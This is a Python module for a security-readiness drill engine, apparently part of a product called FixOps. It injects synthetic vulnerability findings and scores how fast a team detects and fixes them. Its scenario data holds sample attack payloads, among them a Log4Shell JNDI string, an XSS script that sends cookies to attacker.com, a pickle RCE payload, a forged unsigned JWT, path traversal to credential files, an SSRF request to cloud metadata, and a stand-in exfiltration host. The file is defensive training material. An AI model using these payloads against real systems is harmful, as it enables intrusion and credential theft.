"""
FixOps FAIL Engine — Fault & Attack Injection Layer
suite-attack edition

The FAIL Engine is a chaos engineering system for security teams. It injects
synthetic vulnerabilities into the FixOps finding pipeline, then measures how
fast and accurately the security team detects, triages, and remediates them.

This is NOT a CVSS scoring engine. It is a readiness measurement system:
  - Inject a synthetic Log4Shell finding at 09:00
  - Measure: detected at 09:14 (14 min), triaged as CRITICAL at 09:21, fix PR at 10:43
  - Score: Detection=8.2, Triage=9.0, Remediation=7.1, Communication=6.5 → Overall=7.9

Ten injection scenarios:
  1. Log4Shell (RCE via JNDI lookup)
  2. SQL Injection (parameterised → string concatenation)
  3. SSRF (internal service access)
  4. Path Traversal (directory escape)
  5. Insecure Deserialization (pickle/yaml.load)
  6. Hardcoded Credentials (AWS keys, DB passwords)
  7. Broken Auth (JWT none algorithm, session fixation)
  8. XSS (reflected, stored, DOM-based)
  9. Cryptographic Weakness (MD5, SHA1, ECB mode)
  10. Supply Chain (typosquatting dependency)

Usage:
    from attack.fail_engine import DrillEngine, DrillScenario

    engine = DrillEngine()
    drill = engine.create_drill(
        scenario="log4shell",
        target_component="auth-service",
        org_id="org-123",
    )
    score = engine.grade_drill(drill.drill_id)
"""

from __future__ import annotations

import json
import logging
import os
import sqlite3
import uuid
from contextlib import contextmanager
from dataclasses import asdict, dataclass, field
from datetime import datetime, timedelta, timezone
from enum import Enum
from pathlib import Path
from typing import Any, Dict, Generator, List, Optional

logger = logging.getLogger(__name__)

# ---------------------------------------------------------------------------
# Constants
# ---------------------------------------------------------------------------

DB_DIR = Path(os.environ.get("FIXOPS_DATA_DIR", ".fixops_data"))
DB_PATH = DB_DIR / "fail_engine.db"

ENGINE_VERSION = "2.0.0"

NEGLECT_THRESHOLD_DAYS = 90          # Component is neglected if no activity for this long
READINESS_DRILL_WINDOW = 10          # Rolling window for readiness score
INDUSTRY_BENCHMARK_DEFAULT = 6.5    # Default industry baseline (0-10)

# Score dimension weights (must sum to 1.0)
SCORE_WEIGHTS = {
    "detection_speed": 0.30,
    "triage_accuracy": 0.25,
    "remediation_speed": 0.30,
    "communication": 0.15,
}

# Expected SLA targets (minutes) — used for speed scoring
DETECTION_SLA_MINUTES = 60          # Ideal: detect within 60 min
TRIAGE_SLA_MINUTES = 30             # Ideal: triage within 30 min of detection
REMEDIATION_SLA_MINUTES = 480       # Ideal: fix within 8 hours


# ---------------------------------------------------------------------------
# Enums
# ---------------------------------------------------------------------------


class DrillStatus(str, Enum):
    PENDING = "pending"
    ACTIVE = "active"
    DETECTED = "detected"
    TRIAGED = "triaged"
    REMEDIATED = "remediated"
    GRADED = "graded"
    CANCELLED = "cancelled"
    EXPIRED = "expired"


class Severity(str, Enum):
    CRITICAL = "critical"
    HIGH = "high"
    MEDIUM = "medium"
    LOW = "low"
    INFO = "info"


class TriageClassification(str, Enum):
    REAL_CRITICAL = "real_critical"
    REAL_HIGH = "real_high"
    REAL_MEDIUM = "real_medium"
    REAL_LOW = "real_low"
    FALSE_POSITIVE = "false_positive"
    SYNTHETIC = "synthetic"          # Correctly identified as a drill
    WONT_FIX = "wont_fix"


class ReadinessTrend(str, Enum):
    IMPROVING = "improving"
    DECLINING = "declining"
    STABLE = "stable"
    INSUFFICIENT_DATA = "insufficient_data"


# ---------------------------------------------------------------------------
# Scenario Library
# ---------------------------------------------------------------------------


@dataclass
class VulnerabilityScenario:
    """
    A pre-defined synthetic vulnerability scenario.

    Each scenario knows what a realistic finding looks like (CVE, CVSS, etc.)
    and what the ideal team response should be.
    """

    scenario_id: str
    name: str
    description: str
    severity: Severity
    cve_id: Optional[str]
    cvss_score: float
    cwe_ids: List[str]
    mitre_techniques: List[str]           # ATT&CK technique IDs
    mitre_tactics: List[str]
    synthetic_finding: Dict[str, Any]     # The injected finding payload
    expected_detection_minutes: int       # Target: detect within N minutes
    expected_triage_classification: TriageClassification
    expected_remediation_approach: str
    is_custom: bool = False
    created_at: str = field(default_factory=lambda: _utcnow_iso())
    tags: List[str] = field(default_factory=list)

    def to_dict(self) -> Dict[str, Any]:
        d = asdict(self)
        d["severity"] = self.severity.value
        d["expected_triage_classification"] = self.expected_triage_classification.value
        return d


def _utcnow() -> datetime:
    return datetime.now(timezone.utc)


def _utcnow_iso() -> str:
    return _utcnow().isoformat()


def _build_scenario_library() -> Dict[str, VulnerabilityScenario]:
    """Build and return the full built-in scenario library."""

    scenarios: Dict[str, VulnerabilityScenario] = {}

    # ------------------------------------------------------------------
    # 1. Log4Shell — CVE-2021-44228
    # ------------------------------------------------------------------
    scenarios["log4shell"] = VulnerabilityScenario(
        scenario_id="log4shell",
        name="Log4Shell RCE (CVE-2021-44228)",
        description=(
            "Apache Log4j2 JNDI lookup injection allowing unauthenticated remote code "
            "execution. Attacker-controlled LDAP URL is processed in log output, "
            "triggering outbound connection and arbitrary class loading."
        ),
        severity=Severity.CRITICAL,
        cve_id="CVE-2021-44228",
        cvss_score=10.0,
        cwe_ids=["CWE-917", "CWE-20"],
        mitre_techniques=["T1190", "T1059.007", "T1105"],
        mitre_tactics=["Initial Access", "Execution", "Command and Control"],
        synthetic_finding={
            "title": "Log4j2 Remote Code Execution via JNDI Injection (CVE-2021-44228)",
            "description": (
                "The application uses Apache Log4j2 < 2.15.0 and logs user-controlled "
                "input. A JNDI lookup string (${jndi:ldap://attacker.com/a}) in any "
                "logged field triggers outbound DNS/LDAP and enables arbitrary code "
                "execution as the application user."
            ),
            "cve_id": "CVE-2021-44228",
            "cvss_score": 10.0,
            "cvss_vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H",
            "severity": "critical",
            "affected_package": "org.apache.logging.log4j:log4j-core",
            "affected_version_range": "<2.15.0",
            "fixed_version": "2.15.0",
            "evidence": {
                "detected_payload": "${jndi:ldap://169.254.169.254/latest/meta-data/}",
                "log_line": "2024-01-15 09:12:33 ERROR UserService - Login failed for: "
                            "${jndi:ldap://169.254.169.254/latest/meta-data/}",
                "outbound_connection": "169.254.169.254:389",
            },
            "scanner": "FAIL-INJECT-v2",
            "is_synthetic": True,
        },
        expected_detection_minutes=30,
        expected_triage_classification=TriageClassification.REAL_CRITICAL,
        expected_remediation_approach=(
            "Upgrade log4j-core to >= 2.15.0 (or 2.17.1 for CVE-2021-45105). "
            "Set log4j2.formatMsgNoLookups=true as interim mitigation. "
            "Block JNDI lookups at WAF/network layer. Rotate credentials on affected hosts."
        ),
        tags=["rce", "jndi", "log4j", "critical", "kev"],
    )

    # ------------------------------------------------------------------
    # 2. SQL Injection — parameterised → string concatenation
    # ------------------------------------------------------------------
    scenarios["sqli"] = VulnerabilityScenario(
        scenario_id="sqli",
        name="SQL Injection via String Concatenation",
        description=(
            "A database query was refactored from a parameterised prepared statement "
            "to raw string concatenation, introducing a classic SQL injection vector."
        ),
        severity=Severity.HIGH,
        cve_id=None,
        cvss_score=8.8,
        cwe_ids=["CWE-89"],
        mitre_techniques=["T1190", "T1213"],
        mitre_tactics=["Initial Access", "Collection"],
        synthetic_finding={
            "title": "SQL Injection — User-controlled input in raw DB query",
            "description": (
                "The search endpoint constructs SQL queries via string concatenation: "
                "query = 'SELECT * FROM users WHERE name = ' + user_input. "
                "An attacker can extract the full database with a UNION-based payload."
            ),
            "cve_id": None,
            "cvss_score": 8.8,
            "cvss_vector": "CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N",
            "severity": "high",
            "affected_endpoint": "/api/v1/users/search",
            "affected_file": "app/repositories/user_repository.py",
            "affected_line": 147,
            "evidence": {
                "vulnerable_code": "query = f\"SELECT * FROM users WHERE name = '{user_input}'\"",
                "payload_detected": "' OR '1'='1",
                "rows_extractable": "all",
            },
            "scanner": "FAIL-INJECT-v2",
            "is_synthetic": True,
        },
        expected_detection_minutes=45,
        expected_triage_classification=TriageClassification.REAL_HIGH,
        expected_remediation_approach=(
            "Replace string concatenation with parameterised queries / prepared statements. "
            "Use ORM query builders. Add input validation at controller layer. "
            "Deploy WAF rule for SQLi patterns as interim control."
        ),
        tags=["sqli", "injection", "database", "high"],
    )

    # ------------------------------------------------------------------
    # 3. SSRF — internal service access
    # ------------------------------------------------------------------
    scenarios["ssrf"] = VulnerabilityScenario(
        scenario_id="ssrf",
        name="Server-Side Request Forgery (SSRF)",
        description=(
            "The application fetches URLs supplied by the user without validation, "
            "allowing attackers to scan internal services and read cloud metadata."
        ),
        severity=Severity.HIGH,
        cve_id=None,
        cvss_score=7.5,
        cwe_ids=["CWE-918"],
        mitre_techniques=["T1190", "T1046", "T1552.005"],
        mitre_tactics=["Initial Access", "Discovery", "Credential Access"],
        synthetic_finding={
            "title": "SSRF — Unvalidated URL fetch reaches AWS metadata endpoint",
            "description": (
                "The /api/fetch endpoint accepts a user-supplied URL and retrieves it "
                "server-side. No allowlist or network policy prevents internal requests. "
                "AWS IMDSv1 metadata is accessible at http://169.254.169.254/latest/"
            ),
            "cve_id": None,
            "cvss_score": 7.5,
            "cvss_vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N",
            "severity": "high",
            "affected_endpoint": "/api/fetch",
            "affected_file": "app/handlers/fetch_handler.py",
            "affected_line": 38,
            "evidence": {
                "ssrf_target": "http://169.254.169.254/latest/meta-data/iam/security-credentials/",
                "response_received": True,
                "credentials_exposed": ["AWS_ACCESS_KEY_ID", "AWS_SECRET_ACCESS_KEY"],
            },
            "scanner": "FAIL-INJECT-v2",
            "is_synthetic": True,
        },
        expected_detection_minutes=60,
        expected_triage_classification=TriageClassification.REAL_HIGH,
        expected_remediation_approach=(
            "Implement strict URL allowlist. Block RFC-1918 and link-local ranges "
            "(169.254.0.0/16, 10.0.0.0/8, 172.16.0.0/12, 192.168.0.0/16). "
            "Enable IMDSv2 (token-required) on all EC2 instances. "
            "Add egress network policy to restrict fetch service."
        ),
        tags=["ssrf", "cloud", "metadata", "aws", "high"],
    )

    # ------------------------------------------------------------------
    # 4. Path Traversal — directory escape
    # ------------------------------------------------------------------
    scenarios["path_traversal"] = VulnerabilityScenario(
        scenario_id="path_traversal",
        name="Path Traversal — Directory Escape",
        description=(
            "File download endpoint appends user-supplied filename to a base directory "
            "without normalisation, allowing '../' sequences to escape the sandbox."
        ),
        severity=Severity.HIGH,
        cve_id=None,
        cvss_score=7.5,
        cwe_ids=["CWE-22", "CWE-23"],
        mitre_techniques=["T1083", "T1005"],
        mitre_tactics=["Discovery", "Collection"],
        synthetic_finding={
            "title": "Path Traversal — Arbitrary file read via ../  sequences",
            "description": (
                "GET /api/files/download?name=../../etc/passwd successfully returns "
                "the system password file. The server joins the base path and the "
                "user-supplied name without path normalisation or jailing."
            ),
            "cve_id": None,
            "cvss_score": 7.5,
            "cvss_vector": "CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:N/A:N",
            "severity": "high",
            "affected_endpoint": "/api/files/download",
            "affected_file": "app/handlers/file_handler.py",
            "affected_line": 72,
            "evidence": {
                "payload": "../../etc/passwd",
                "resolved_path": "/etc/passwd",
                "file_returned": True,
                "sensitive_files_accessible": ["/etc/passwd", "/etc/shadow", "~/.ssh/id_rsa"],
            },
            "scanner": "FAIL-INJECT-v2",
            "is_synthetic": True,
        },
        expected_detection_minutes=45,
        expected_triage_classification=TriageClassification.REAL_HIGH,
        expected_remediation_approach=(
            "Use os.path.realpath() and verify the resolved path starts with the "
            "intended base directory. Reject any path containing '..'. "
            "Use a dedicated file serving library that handles this automatically. "
            "Apply principle of least privilege for file system access."
        ),
        tags=["path-traversal", "lfi", "file", "high"],
    )

    # ------------------------------------------------------------------
    # 5. Insecure Deserialization — pickle/yaml.load
    # ------------------------------------------------------------------
    scenarios["insecure_deserialization"] = VulnerabilityScenario(
        scenario_id="insecure_deserialization",
        name="Insecure Deserialization (pickle/yaml.load)",
        description=(
            "The API deserialises user-supplied data using Python pickle or "
            "yaml.load() without safe_load(), enabling arbitrary code execution."
        ),
        severity=Severity.CRITICAL,
        cve_id=None,
        cvss_score=9.8,
        cwe_ids=["CWE-502"],
        mitre_techniques=["T1059.006", "T1190"],
        mitre_tactics=["Execution", "Initial Access"],
        synthetic_finding={
            "title": "Insecure Deserialization — pickle.loads() on user-supplied data",
            "description": (
                "The /api/session/restore endpoint accepts a base64-encoded session "
                "blob and deserialises it with pickle.loads(). An attacker can craft "
                "a malicious pickle payload to execute arbitrary OS commands."
            ),
            "cve_id": None,
            "cvss_score": 9.8,
            "cvss_vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H",
            "severity": "critical",
            "affected_endpoint": "/api/session/restore",
            "affected_file": "app/handlers/session_handler.py",
            "affected_line": 56,
            "evidence": {
                "deserializer": "pickle.loads",
                "input_source": "POST body (base64-encoded)",
                "poc_payload": "cos\nsystem\n(S'id'\ntR.",
                "rce_achieved": True,
            },
            "scanner": "FAIL-INJECT-v2",
            "is_synthetic": True,
        },
        expected_detection_minutes=20,
        expected_triage_classification=TriageClassification.REAL_CRITICAL,
        expected_remediation_approach=(
            "Never deserialise user-controlled data with pickle. "
            "Use JSON or MessagePack for session data. "
            "If YAML is required, always use yaml.safe_load(). "
            "Add input size limits and type checks before any deserialisation."
        ),
        tags=["deserialization", "rce", "pickle", "yaml", "critical"],
    )

    # ------------------------------------------------------------------
    # 6. Hardcoded Credentials — AWS keys, DB passwords
    # ------------------------------------------------------------------
    scenarios["hardcoded_credentials"] = VulnerabilityScenario(
        scenario_id="hardcoded_credentials",
        name="Hardcoded Credentials (AWS Keys / DB Passwords)",
        description=(
            "Live AWS access keys and database passwords committed directly in "
            "source code, accessible to anyone with repository access."
        ),
        severity=Severity.CRITICAL,
        cve_id=None,
        cvss_score=9.1,
        cwe_ids=["CWE-798", "CWE-259"],
        mitre_techniques=["T1552.001", "T1078"],
        mitre_tactics=["Credential Access", "Defense Evasion"],
        synthetic_finding={
            "title": "Hardcoded AWS Credentials and Database Password in Source Code",
            "description": (
                "Committed file config/settings.py contains live AWS access key "
                "AKIA[REDACTED] and a plaintext database password. "
                "These credentials grant access to production S3 buckets and RDS instance."
            ),
            "cve_id": None,
            "cvss_score": 9.1,
            "cvss_vector": "CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N",
            "severity": "critical",
            "affected_file": "config/settings.py",
            "affected_lines": [23, 24, 41],
            "evidence": {
                "credentials_found": [
                    {"type": "aws_access_key", "pattern": "AKIA[0-9A-Z]{16}", "line": 23},
                    {"type": "aws_secret_key", "pattern": "[0-9a-zA-Z/+]{40}", "line": 24},
                    {"type": "db_password", "pattern": "DB_PASSWORD = \"...*\"", "line": 41},
                ],
                "git_history_exposure": True,
                "commit_count_with_secret": 47,
            },
            "scanner": "FAIL-INJECT-v2",
            "is_synthetic": True,
        },
        expected_detection_minutes=15,
        expected_triage_classification=TriageClassification.REAL_CRITICAL,
        expected_remediation_approach=(
            "Immediately rotate all exposed credentials. "
            "Remove secrets from source code and git history (BFG Repo-Cleaner). "
            "Move to secrets manager (AWS Secrets Manager, HashiCorp Vault). "
            "Add pre-commit hooks (detect-secrets, truffleHog) to prevent re-introduction."
        ),
        tags=["credentials", "secrets", "aws", "database", "critical", "kev"],
    )

    # ------------------------------------------------------------------
    # 7. Broken Auth — JWT none algorithm / session fixation
    # ------------------------------------------------------------------
    scenarios["broken_auth"] = VulnerabilityScenario(
        scenario_id="broken_auth",
        name="Broken Auth — JWT None Algorithm / Session Fixation",
        description=(
            "Authentication bypass via JWT 'none' algorithm or session fixation attack, "
            "allowing an attacker to impersonate any user including administrators."
        ),
        severity=Severity.CRITICAL,
        cve_id=None,
        cvss_score=9.8,
        cwe_ids=["CWE-287", "CWE-384", "CWE-347"],
        mitre_techniques=["T1078", "T1550.001"],
        mitre_tactics=["Defense Evasion", "Lateral Movement"],
        synthetic_finding={
            "title": "JWT None Algorithm Accepted — Authentication Bypass",
            "description": (
                "The JWT validation code accepts the 'alg: none' header value, "
                "allowing unsigned tokens to pass authentication. An attacker can "
                "forge a token for any user_id including admin accounts without "
                "knowing the signing secret."
            ),
            "cve_id": None,
            "cvss_score": 9.8,
            "cvss_vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H",
            "severity": "critical",
            "affected_endpoint": "/api/v1/auth/verify",
            "affected_file": "app/middleware/auth_middleware.py",
            "affected_line": 88,
            "evidence": {
                "forged_token": "eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJ1c2VyX2lkIjoxLCJyb2xlIjoiYWRtaW4ifQ.",
                "user_impersonated": "admin (user_id=1)",
                "access_granted": True,
                "session_fixation_also_present": True,
            },
            "scanner": "FAIL-INJECT-v2",
            "is_synthetic": True,
        },
        expected_detection_minutes=20,
        expected_triage_classification=TriageClassification.REAL_CRITICAL,
        expected_remediation_approach=(
            "Explicitly reject 'none' algorithm in JWT validation. "
            "Use asymmetric signing (RS256/ES256) instead of HS256. "
            "Validate alg header against a strict allowlist. "
            "Regenerate session ID after authentication (session fixation). "
            "Implement refresh token rotation."
        ),
        tags=["jwt", "broken-auth", "session", "critical"],
    )

    # ------------------------------------------------------------------
    # 8. XSS — reflected, stored, DOM-based
    # ------------------------------------------------------------------
    scenarios["xss"] = VulnerabilityScenario(
        scenario_id="xss",
        name="Cross-Site Scripting (Reflected + Stored)",
        description=(
            "User-controlled data rendered in HTML without encoding. Both reflected "
            "(via URL parameter) and stored (via database) XSS vectors present."
        ),
        severity=Severity.HIGH,
        cve_id=None,
        cvss_score=7.4,
        cwe_ids=["CWE-79", "CWE-80", "CWE-83"],
        mitre_techniques=["T1059.007", "T1185"],
        mitre_tactics=["Execution", "Collection"],
        synthetic_finding={
            "title": "Stored and Reflected XSS — Unencoded user input in HTML output",
            "description": (
                "The user profile 'bio' field stores HTML content without sanitisation. "
                "When rendered in admin views, arbitrary scripts execute in browser context. "
                "The /search?q= parameter is also reflected without encoding."
            ),
            "cve_id": None,
            "cvss_score": 7.4,
            "cvss_vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N",
            "severity": "high",
            "affected_endpoints": [
                "/api/v1/users/{id}/profile",
                "/search",
                "/admin/users",
            ],
            "evidence": {
                "stored_payload": "<script>document.location='https://attacker.com/steal?c='+document.cookie</script>",
                "reflected_payload": "<img src=x onerror=alert(1)>",
                "dom_payload": "javascript:void(eval(location.hash.slice(1)))",
                "cookie_theft_possible": True,
                "csp_present": False,
            },
            "scanner": "FAIL-INJECT-v2",
            "is_synthetic": True,
        },
        expected_detection_minutes=60,
        expected_triage_classification=TriageClassification.REAL_HIGH,
        expected_remediation_approach=(
            "Apply context-sensitive output encoding (HTML entity, JS, CSS, URL). "
            "Use a trusted HTML sanitiser (DOMPurify) for rich text. "
            "Implement strict Content-Security-Policy (script-src 'self'). "
            "Set HttpOnly and SameSite=Strict on session cookies."
        ),
        tags=["xss", "injection", "browser", "csp", "high"],
    )

    # ------------------------------------------------------------------
    # 9. Cryptographic Weakness — MD5/SHA1/ECB mode
    # ------------------------------------------------------------------
    scenarios["crypto_weakness"] = VulnerabilityScenario(
        scenario_id="crypto_weakness",
        name="Cryptographic Weakness (MD5/SHA1/ECB Mode)",
        description=(
            "Passwords hashed with MD5 or SHA1 (no salt), and symmetric encryption "
            "using AES in ECB mode — allowing pattern analysis and rainbow table attacks."
        ),
        severity=Severity.HIGH,
        cve_id=None,
        cvss_score=7.5,
        cwe_ids=["CWE-327", "CWE-328", "CWE-760"],
        mitre_techniques=["T1110.002", "T1552.001"],
        mitre_tactics=["Credential Access"],
        synthetic_finding={
            "title": "Weak Cryptography — MD5 Password Hashing and AES-ECB Encryption",
            "description": (
                "User passwords are hashed with MD5 without salt (hashlib.md5(password)). "
                "Encryption of user data uses AES in ECB mode. "
                "MD5 hashes are trivially reversed via rainbow tables. "
                "ECB mode leaks patterns in encrypted data."
            ),
            "cve_id": None,
            "cvss_score": 7.5,
            "cvss_vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N",
            "severity": "high",
            "affected_files": [
                "app/auth/password_utils.py",
                "app/crypto/encryption.py",
            ],
            "evidence": {
                "hash_algorithm": "MD5",
                "salt_used": False,
                "encryption_mode": "AES-ECB",
                "crackable_hashes": ["5f4dcc3b5aa765d61d8327deb882cf99 (password)"],
                "pattern_leak_demo": True,
            },
            "scanner": "FAIL-INJECT-v2",
            "is_synthetic": True,
        },
        expected_detection_minutes=90,
        expected_triage_classification=TriageClassification.REAL_HIGH,
        expected_remediation_approach=(
            "Replace MD5/SHA1 with bcrypt, scrypt, or Argon2id for password hashing. "
            "Use AES-GCM or AES-CBC (with random IV) instead of ECB mode. "
            "Plan a credential rotation for all affected users. "
            "Add automated crypto policy checks to CI pipeline."
        ),
        tags=["crypto", "md5", "sha1", "ecb", "password", "high"],
    )

    # ------------------------------------------------------------------
    # 10. Supply Chain — typosquatting dependency
    # ------------------------------------------------------------------
    scenarios["supply_chain"] = VulnerabilityScenario(
        scenario_id="supply_chain",
        name="Supply Chain Attack — Typosquatting Dependency",
        description=(
            "A package with a name one character off from a popular library was "
            "installed. The package exfiltrates environment variables on import."
        ),
        severity=Severity.CRITICAL,
        cve_id=None,
        cvss_score=9.0,
        cwe_ids=["CWE-1357", "CWE-494"],
        mitre_techniques=["T1195.001", "T1059.006", "T1020"],
        mitre_tactics=["Initial Access", "Execution", "Exfiltration"],
        synthetic_finding={
            "title": "Typosquatting Dependency — 'reqeusts' exfiltrates environment on import",
            "description": (
                "requirements.txt contains 'reqeusts==2.31.0' (note: misspelling of 'requests'). "
                "This package is not the legitimate requests library. "
                "Its __init__.py sends all environment variables to an attacker endpoint "
                "at import time, including API keys and database credentials."
            ),
            "cve_id": None,
            "cvss_score": 9.0,
            "cvss_vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:L/A:N",
            "severity": "critical",
            "affected_file": "requirements.txt",
            "affected_line": 17,
            "evidence": {
                "malicious_package": "reqeusts",
                "legitimate_package": "requests",
                "exfiltration_endpoint": "https://collector.evil.example.com/env",
                "data_exfiltrated": ["AWS_ACCESS_KEY_ID", "DATABASE_URL", "SECRET_KEY"],
                "installed_on_hosts": 3,
            },
            "scanner": "FAIL-INJECT-v2",
            "is_synthetic": True,
        },
        expected_detection_minutes=120,
        expected_triage_classification=TriageClassification.REAL_CRITICAL,
        expected_remediation_approach=(
            "Remove malicious package immediately. "
            "Rotate ALL environment variables and secrets (full compromise assumed). "
            "Replace with legitimate 'requests' package. "
            "Enable package hash pinning in requirements.txt. "
            "Add dependency confusion and typosquatting checks to CI (pip-audit, safety). "
            "Enable private PyPI mirror for production deployments."
        ),
        tags=["supply-chain", "typosquatting", "dependency", "critical", "exfiltration"],
    )

    return scenarios


# ---------------------------------------------------------------------------
# Drill data structures
# ---------------------------------------------------------------------------


@dataclass
class DrillTimeline:
    """Timestamped events for a drill's lifecycle."""

    drill_id: str
    injected_at: Optional[str] = None
    detected_at: Optional[str] = None
    triaged_at: Optional[str] = None
    remediated_at: Optional[str] = None
    graded_at: Optional[str] = None
    cancelled_at: Optional[str] = None
    events: List[Dict[str, Any]] = field(default_factory=list)

    def add_event(self, event_type: str, detail: str, actor: Optional[str] = None) -> None:
        self.events.append({
            "event_type": event_type,
            "detail": detail,
            "actor": actor,
            "timestamp": _utcnow_iso(),
        })

    def to_dict(self) -> Dict[str, Any]:
        return asdict(self)


@dataclass
class DrillScore:
    """4-dimension score for a completed drill."""

    drill_id: str

    # Dimension scores (0-10)
    detection_speed: float = 0.0         # How fast was the finding noticed?
    triage_accuracy: float = 0.0         # Was it correctly classified?
    remediation_speed: float = 0.0       # How fast was the fix applied?
    communication: float = 0.0           # Was the right team notified?

    # Overall weighted score
    overall: float = 0.0

    # Detailed breakdown
    detection_minutes_actual: Optional[int] = None
    detection_minutes_target: Optional[int] = None
    triage_classification_actual: Optional[str] = None
    triage_classification_expected: Optional[str] = None
    remediation_minutes_actual: Optional[int] = None
    escalated_correctly: bool = False
    team_notified: bool = False

    # Grade
    grade: str = "F"
    feedback: List[str] = field(default_factory=list)

    def to_dict(self) -> Dict[str, Any]:
        return asdict(self)


@dataclass
class Drill:
    """
    A single FAIL Engine drill — a synthetic vulnerability injection with
    full lifecycle tracking and scoring.
    """

    drill_id: str
    scenario_id: str
    scenario_name: str
    target_component: str
    org_id: str
    status: DrillStatus = DrillStatus.PENDING
    severity: Severity = Severity.HIGH

    # Synthetic finding injected into the pipeline
    synthetic_finding_id: str = field(default_factory=lambda: f"SYN-{uuid.uuid4().hex[:10].upper()}")
    synthetic_finding: Dict[str, Any] = field(default_factory=dict)

    # Response tracking
    detected_by: Optional[str] = None
    triaged_by: Optional[str] = None
    remediated_by: Optional[str] = None
    triage_classification: Optional[TriageClassification] = None
    escalated: bool = False
    notified_teams: List[str] = field(default_factory=list)

    # Scoring
    score: Optional[DrillScore] = None

    # Timeline
    timeline: DrillTimeline = field(default_factory=lambda: DrillTimeline(drill_id=""))

    # Metadata
    created_at: str = field(default_factory=_utcnow_iso)
    expires_at: str = field(default_factory=lambda: (
        _utcnow() + timedelta(hours=48)
    ).isoformat())
    notes: str = ""

    def __post_init__(self) -> None:
        if not self.timeline.drill_id:
            self.timeline.drill_id = self.drill_id

    def to_dict(self) -> Dict[str, Any]:
        d = asdict(self)
        d["status"] = self.status.value
        d["severity"] = self.severity.value
        if self.triage_classification:
            d["triage_classification"] = self.triage_classification.value
        return d


# ---------------------------------------------------------------------------
# Training data structures (ML feedback loop)
# ---------------------------------------------------------------------------


@dataclass
class TrainingSample:
    """
    A labeled training sample generated from a completed drill.

    Two primary signals:
    1. Detection signal: was the synthetic finding detected, and how fast?
    2. Triage signal: was it correctly classified?
    """

    sample_id: str
    drill_id: str
    org_id: str
    scenario_id: str
    severity: str

    # Detection label
    detected: bool = False
    detection_minutes: Optional[int] = None
    detection_label: str = "missed"          # "fast" | "slow" | "missed"

    # Triage label
    triage_correct: bool = False
    triage_expected: Optional[str] = None
    triage_actual: Optional[str] = None
    triage_label: str = "incorrect"          # "correct" | "incorrect" | "skipped"

    # Features for ML models
    features: Dict[str, Any] = field(default_factory=dict)

    created_at: str = field(default_factory=_utcnow_iso)

    def to_dict(self) -> Dict[str, Any]:
        return asdict(self)


# ---------------------------------------------------------------------------
# Neglect Zone
# ---------------------------------------------------------------------------


@dataclass
class NeglectZone:
    """A component with no recent security activity."""

    component: str
    org_id: str
    last_activity_at: Optional[str]
    days_since_activity: int
    activity_types_missing: List[str]          # scan, review, drill
    risk_level: str                            # low, medium, high, urgent
    has_critical_data: bool = False
    suggested_drill_scenario: Optional[str] = None
    reason: str = ""

    def to_dict(self) -> Dict[str, Any]:
        return asdict(self)


# ---------------------------------------------------------------------------
# Readiness Score
# ---------------------------------------------------------------------------


@dataclass
class ReadinessScore:
    """Organisation and team readiness aggregation."""

    org_id: str
    overall_score: float                       # 0-10 rolling average
    drill_count: int
    last_drill_at: Optional[str]
    trend: ReadinessTrend
    team_scores: Dict[str, float]             # team_name → score
    dimension_averages: Dict[str, float]      # detection_speed → avg, etc.
    industry_benchmark: float
    benchmark_delta: float                    # org - benchmark
    percentile: int                           # 0-100
    graded_drills: List[Dict[str, Any]]       # last N drill summaries
    computed_at: str = field(default_factory=_utcnow_iso)

    def to_dict(self) -> Dict[str, Any]:
        d = asdict(self)
        d["trend"] = self.trend.value
        return d


# ---------------------------------------------------------------------------
# SQLite Database Layer
# ---------------------------------------------------------------------------


class DrillDB:
    """
    SQLite-backed persistence layer for the FAIL Engine (suite-attack edition).

    Tables:
      fail_drills           — drill records
      fail_scenarios        — built-in + custom scenarios
      fail_activity_log     — component security activity tracking
      fail_training_samples — labeled ML training data
    """

    def __init__(self, db_path: Optional[Path] = None) -> None:
        self._db_path = Path(db_path or DB_PATH)
        self._db_path.parent.mkdir(parents=True, exist_ok=True)
        self._init_db()

    @contextmanager
    def _conn(self) -> Generator[sqlite3.Connection, None, None]:
        conn = sqlite3.connect(str(self._db_path), check_same_thread=False)
        conn.row_factory = sqlite3.Row
        conn.execute("PRAGMA journal_mode=WAL")
        conn.execute("PRAGMA foreign_keys=ON")
        try:
            yield conn
            conn.commit()
        except Exception:
            conn.rollback()
            raise
        finally:
            conn.close()

    def _init_db(self) -> None:
        with self._conn() as conn:
            conn.executescript("""
                CREATE TABLE IF NOT EXISTS fail_drills (
                    drill_id            TEXT PRIMARY KEY,
                    scenario_id         TEXT NOT NULL,
                    scenario_name       TEXT NOT NULL,
                    target_component    TEXT NOT NULL,
                    org_id              TEXT NOT NULL,
                    status              TEXT NOT NULL DEFAULT 'pending',
                    severity            TEXT NOT NULL DEFAULT 'high',
                    synthetic_finding_id TEXT NOT NULL,
                    synthetic_finding   TEXT NOT NULL DEFAULT '{}',
                    detected_by         TEXT,
                    triaged_by          TEXT,
                    remediated_by       TEXT,
                    triage_classification TEXT,
                    escalated           INTEGER NOT NULL DEFAULT 0,
                    notified_teams      TEXT NOT NULL DEFAULT '[]',
                    score_json          TEXT,
                    timeline_json       TEXT NOT NULL DEFAULT '{}',
                    created_at          TEXT NOT NULL,
                    expires_at          TEXT NOT NULL,
                    notes               TEXT NOT NULL DEFAULT ''
                );

                CREATE INDEX IF NOT EXISTS idx_fail_drills_org
                    ON fail_drills(org_id);
                CREATE INDEX IF NOT EXISTS idx_fail_drills_status
                    ON fail_drills(status);
                CREATE INDEX IF NOT EXISTS idx_fail_drills_created
                    ON fail_drills(created_at);
                CREATE INDEX IF NOT EXISTS idx_fail_drills_component
                    ON fail_drills(target_component);

                CREATE TABLE IF NOT EXISTS fail_scenarios (
                    scenario_id         TEXT PRIMARY KEY,
                    name                TEXT NOT NULL,
